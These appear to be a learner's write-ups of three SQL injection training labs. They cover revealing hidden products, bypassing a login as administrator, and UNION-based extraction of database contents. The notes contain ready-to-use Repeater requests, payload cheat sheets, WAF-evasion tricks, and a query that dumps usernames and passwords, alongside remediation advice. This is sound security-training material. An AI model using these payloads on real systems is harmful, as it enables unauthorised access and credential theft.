# SQL Injection Lab-1 — Retrieving Hidden Data 

---

## 🔹 One-line summary
In-band SQL injection (WHERE-clause manipulation): inject into a filter parameter to neutralize AND released = 1 (or force the WHERE to true) and reveal unreleased/hidden products.

---

## 🔹 What is this issue?
SQL injection (SQLi) occurs when untrusted input is concatenated into SQL queries. By injecting SQL metacharacters or logic (e.g. ' OR 1=1 --) an attacker can change the query semantics and return rows the application intended to hide.

---

## 🔹 Why this matters (real-world risk)
- Exposes sensitive or unreleased data (products, user records).  
- Can escalate to data modification, account takeover, or RCE depending on DB features and privileges.  
- Often allows enumeration of database structure, union-based data extraction, or blind/time-based exfiltration.

---

## 🔹 High-value places to test
- Filter / search endpoints: /filter?category=..., /search?q=...  
- Item lookups: /product?id=..., /item?id=...  
- Sorting / pagination params: order, limit, page  
- Admin exports / downloads: /export?table=...  
- JSON APIs: values in POST/PUT JSON bodies that end up in SQL strings

---

## 🔹 Quick reconnaissance / how to spot it
1. Submit a single quote ' and look for DB errors or unusual responses.  
2. Try boolean tests: OR 1=1 vs OR 1=2 and compare content/length.  
3. Inspect JS and links for parameters that map to DB-driven pages.  
4. Watch for subtle clues: extra rows, changed pagination, different content-length, timing differences.

---

## 🔹 Lab walkthrough — compact (exact steps)
1. Open Burp Proxy and capture a normal category request (e.g., click *Techgifts*).  
2. Right-click captured request → *Send to Repeater*.  
3. Modify category parameter to neutralize the released filter, for example:

GET /filter?category=Techgifts'+OR+1=1-- HTTP/2
Host: <lab-host>
...

4. Send the modified request in Repeater and inspect the response — unreleased products should now be visible.
5. Save raw request/response as PoC and take a screenshot.
*Lab solved.*

---

## 🔹 Proof (evidence)

![SQLi payload injected in request (category modified)](../images/sqli-lab1-injected.png)  
(Screenshot 1: modified request showing payload CorporateGifts' OR 1=1-- in the URL/params.)

![Lab solved — unreleased products displayed after injection](../images/sqli-lab1-solved.png)  
(Screenshot 2: page showing unreleased products / PoC that the injection returned additional items.)

---

## 🔹 PoC / Repeater-ready example 

GET /filter?category=Techgifts'+OR+1=1-- HTTP/1.1
Host: <LAB_HOST>
User-Agent: Mozilla/5.0
Accept: /
Connection: close

---

*If the parameter is numeric, use:*  
id=1' OR 1=1-- (or id=1 OR 1=1 depending on context).

*URL-encode payloads when sending via browser* (e.g., '%20OR%201%3D1--).

---

## 🔹 Common payloads & quick cheats

- *Comment out rest:* '+-- or '+OR+1=1--  
- *Force true:* ' OR '1'='1'--  
- *Numeric id injection:* 1' OR 1=1--  
- *Time-based (MySQL):* ' OR SLEEP(5)--  
- *UNION discovery:* try ORDER BY then UNION SELECT NULL,version(),NULL-- (only if visible output)

*Always adapt comment style to the DB (--, #, /* ... */).*

---

## 🔹 Troubleshooting

- *No visible change:* try URL-encoding, use POST/JSON variants, or test different params.  
- *WAF interference:* attempt simple obfuscation (e.g., UN/**/ION) or minimal payloads.  
- *No output:* use blind techniques (time-based or OOB) *with permission*.

---

## 🔹 Fixes / remediation 

- Use *parameterized queries / prepared statements* (no string concatenation).  
- Enforce strict *whitelist validation* for known values (e.g., allowed categories).  
- Hide verbose DB errors from users; log them internally.  
- Use *least-privilege DB accounts* and separate read-only roles where possible.  
- Add monitoring / WAF as defense-in-depth (not a replacement).

---

## 🔹 Pentest checklist 

- Identify inputs reaching DB (GET/POST/JSON/headers/cookies).  
- Test ' for errors.  
- Try boolean tests: OR 1=1-- / OR 1=2--.  
- If data returned, attempt UNION/ORDER BY to enumerate columns.  
- If hidden, try time-based or OOB techniques.  
- Save PoC: raw request + response + screenshot.

---

# SQL Injection Lab-2 — Subverting Application Logic (Login Bypass) — Notes 

Lab type: in-band SQLi (authentication bypass via WHERE-clause manipulation / comment-out).

---

## 🔹 1. What is this issue?

A SQL injection in an authentication query lets an attacker manipulate the WHERE clause so the password check is never applied. By injecting a comment (e.g. --) or an always-true expression into the *username* field, the attacker can cause the query to return the target user row and the app treats them as authenticated — no password required.

---

## 🔹 2. Why this matters (real-world risk)

- Immediate account takeover (often admin).  
- Full application compromise if the account has high privileges.  
- Simple and frequently present in legacy code that concatenates inputs into SQL.  
- Easy to chain with further attacks (data exfiltration, privilege escalation, persistence).

Impact example: login as administrator → delete users / change configs / exfiltrate data.

---

## 🔹 3. High-value places to test (quick)

- Login endpoints: POST /login, /auth, /session.  
- Any endpoint that constructs SQL from user-controlled fields w/o parameterization.  
- API endpoints accepting username, userId, email in JSON or form data.

---

## 🔹 4. How to find it quickly

- Submit a single quote ' in the username and watch for errors or different behaviour.  
- Try common auth-bypass payloads in the username field:

  - administrator'--  
  - administrator' OR '1'='1  
  - admin'/*  (DB/comment dependent)

- Observe redirects, status codes, response bodies — successful injection often returns admin pages or different Location headers.

---

## 🔹 5. Lab walkthrough — compact (exact steps)

1. *Capture a baseline login request*  
   - Proxy *ON*; perform a normal login to capture POST /login (username/password).  
   - In Burp → *Proxy → HTTP history* find the POST /login and *Send to Repeater*.

2. *Send to Repeater and prepare PoC*  
   - In Repeater edit the request body (or form fields).  
   - Replace username= value with the SQL comment payload, for example:  
     
     username=administrator'--&password=anything
     

3. *Leave password blank or unchanged*  
   - You may set password= to an arbitrary value or leave it empty — the injection should remove the password check.

4. *Send the modified request*  
   - Click *Send* in Repeater and inspect raw response headers. Look for a redirect such as:
     
     HTTP/1.1 302 Found
     Location: /my-account?id=administrator
     

5. *Follow the redirect / verify in browser*  
   - Replay cookies / session in browser or follow the redirect in Repeater. If you see admin UI / account page you are authenticated as the target user. Lab solved.
     
---

## 🧾 Proof / Evidence

1. *Screenshot — PoC Repeater request/response (injected login POST)*  
   ../images/sqli-login-bypass-post.png  
   Description: Repeater request showing the modified POST /login (payload username=administrator'--) and the response headers (302 Location: /my-account?id=administrator).  
   ![PoC — SQLi login bypass](../images/sqli-login-bypass-post.png)

---

## 🔹 6. Repeater / PoC templates 

*Form-encoded login bypass (example)*

POST /login HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<YOUR_SESSION>

username=administrator'--&password=anything

*GET-style (if login via querystring)*

GET /login?username=administrator'--&password=anything HTTP/1.1 Host: <LAB_HOST>

(Adjust method/headers to match the app. URL-encode when pasting into browser.)

---

## 🔹 7. Common payloads 

- administrator'--  (comment-out rest)  
- administrator' OR '1'='1'--  
- ' OR '1'='1'--  (may log in as first user returned)  
- admin'/*  (DB-specific comment forms)  
- Numeric ids: 1 OR 1=1--

Always adapt to DB comment style and context (string vs numeric).

---

## 🔹 8. Troubleshooting

- No redirect/visible change → try alternate comment styles (--, #, /* */) and URL-encode special chars.  
- WAF blocks simple payloads → try minor obfuscation (e.g., OR/**/1=1).  
- If query expects numeric id → remove quotes and use numeric payloads.  
- Use Repeater to inspect raw responses (redirects, cookies) rather than relying only on browser UI.

---

## 🔹 9. Fixes / remediation (what to recommend)

- Use parameterized queries / prepared statements for all DB access (no string concatenation).  
- Use ORM safe-query mechanisms; never interpolate untrusted input.  
- Return generic login error messages — avoid revealing whether username exists.  
- Apply WAF/input validation as defense-in-depth (not a substitute for parameterized queries).  
- Review & sanitize legacy auth code paths; add automated tests to detect auth bypass via injection.

---

## 🔹 10. Pentest checklist 

- Affected endpoint & method: POST /login.  
- Vulnerable parameter: username.  
- Exact PoC request & raw response showing redirect to /my-account?id=administrator.  
- Evidence: screenshot of admin page after bypass.  
- Impact: authentication bypass → admin takeover.  
- Remediation summary: parameterized queries + hardening.

---

# SQL Injection Lab-3 — Retrieving Hidden Data 

---

## 🔹 One-line summary
SQL injection lets attacker-controlled input alter a query (WHERE/UNION) so it returns rows it normally wouldn’t — e.g., unreleased products, user data, or internal information.

---

## 🔹 What is this topic? (short)
SQL injection (SQLi) occurs when untrusted input is concatenated into SQL. In the “retrieving hidden data” lab we neutralize filters (e.g., AND released = 1) or use UNION SELECT to extract hidden rows from the database.

---

## 🔹 Why this matters (real-world risk)
- *Data disclosure:* sensitive rows (users, configs, secrets) can be read.  
- *Business impact:* leak of unreleased products or internal data.  
- *Pivoting:* DB contents often reveal creds, hostnames or queries to internal services → further compromise.

---

## 🔹 High-value injection targets
- Filter/search params: /filter?category=..., /search?q=...  
- ID/item params: /product?id=..., /item?id=...  
- Sort/pagination: order, limit, page  
- JSON body fields in APIs: {"category":"..."}  
- Export endpoints: /export?table=...

---

## 🔹 Quick concept checklist
- Test a single-quote ' for errors.  
- Boolean tests: OR 1=1 vs OR 1=2.  
- Use comments to truncate remainder (--, #, /* */).  
- Count columns with UNION SELECT NULL,....  
- Use UNION SELECT 'MKR1','MKR2',... to find a reflected column.  
- If no direct output: use blind (time) or OOB (DNS/HTTP) techniques.

---

## 🔹 Lab walkthrough — exact steps 

1. *Capture baseline request*  
   - Proxy *ON* → click the category/filter in the app. Copy the captured GET /filter?category=... to *Repeater*.

2. *Sanity test*  
   - Edit parameter: add a single-quote (e.g. category=Gifts') and *Send*. Look for DB errors or page changes.

3. *Count columns (UNION-NULL method)*  
   - Try:
     
     GET /filter?category=Gifts' UNION SELECT NULL-- 
     
     If an error occurs, increase NULL count:
     
     GET /filter?category=Gifts' UNION SELECT NULL,NULL-- 
     GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- 
     
     Continue until the server returns an altered/normal response — that NULL count = number of columns.

4. *Find a reflected column*  
   - With the correct column count inject markers:
     
     GET /filter?category=Gifts' UNION SELECT 'MKR1','MKR2','MKR3'-- 
     
     (adjust number of MKR values to match column count). *Send* and inspect the raw response / page source for MKR1/MKR2/MKR3 — the one you see is the reflected column.

5. *Extract data using the reflected column*  
   - Replace the marker in the reflected column with useful functions:
     
     GET /filter?category=Gifts' UNION SELECT NULL,version(),NULL--        (if column2 reflected)
     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(table_name SEPARATOR 0x3a),NULL FROM information_schema.tables WHERE table_schema=database()--
     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users--
     
     Adjust queries to the DB (MySQL examples above). *Send* and capture the response showing extracted rows.

6. *Save PoC*  
   - Save the exact raw request(s) and response(s). Take a screenshot of Repeater showing the payload and the page/body with extracted data.

---

## 🧾 Proof / Evidence

1. *Screenshot — PoC request/response (columns matched)*  
  ![Injected SQL Injection in product category](../images/sqli-filter-hidden.png)
   Description: Repeater request showing the injected UNION SELECT NULL,... payload and the response containing unreleased/hidden data (used to confirm correct column count and the reflected column).

---

## 🔹 PoC / Repeater-ready example (copy/paste & edit)

http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
Host: <LAB_HOST>
User-Agent: Mozilla/5.0
Accept: /
Connection: close

When columns = 3 and column 2 is reflected:

GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users-- HTTP/1.1
Host: <LAB_HOST>
...

> URL-encode payloads when pasting into a browser (e.g. ' → %27, spaces → %20, -- → %2D%2D) if needed

---

## 🔹 Common payloads & quick cheats

- *Comment out rest:*  
  `' + --` or `' + OR + 1=1 --`

- *Force true:*  
  `' OR '1'='1'--`

- *Numeric id injection:*  
  `1' OR 1=1--`

- *Time-based (MySQL):*  
  `' OR SLEEP(5)--`

- *Count columns:*  
  `UNION SELECT NULL, NULL, ... --`

- *Marker test (find reflected column):*  
  `UNION SELECT 'MKR1','MKR2',... --`

> *Note:* Always adapt comment style and payload syntax to the target DB and context (--, #, /* ... */).

---

## 🔹 Troubleshooting

- *500 / syntax errors when NULL count is wrong* → increase/decrease NULL count until the server stops returning a syntax error.  
- *No visible marker* → check raw HTML, element attributes, inline scripts, and comments (the marker may be reflected in non-visible locations).  
- *Type mismatch errors* → use NULL for non-reflected columns or CAST(... AS CHAR) for type conversion.  
- *WAF blocking UNION* → try simple obfuscation (e.g., UN/**/ION) or use ORDER BY column-counting to discover number of columns.  
- *Large results truncated* → extract in smaller chunks using LIMIT/OFFSET or SUBSTRING().

---

## 🔹 Fixes / remediation (what to report)

- Use *parameterized queries / prepared statements* (never concatenate user input into SQL).  
- Enforce strict *whitelists* for expected values (categories, IDs).  
- Remove verbose DB errors from public responses; log them internally.  
- Apply *least-privilege* principles to DB accounts (no FILE/xp_cmdshell for web app user).  
- Output-encode DB-derived content and monitor for suspicious query patterns.

---

## 🔹 Pentest checklist (copyable)

1. Capture request → baseline.  
2. Test a single-quote ' → see if errors appear.  
3. Count columns using UNION SELECT NULL,....  
4. Find reflected column with UNION SELECT 'MKR1',....  
5. Extract data via group_concat / concat (or equivalent).  
6. Save raw PoC request + response and take screenshots.  
7. Recommend parameterized queries and whitelisting in the report.

---
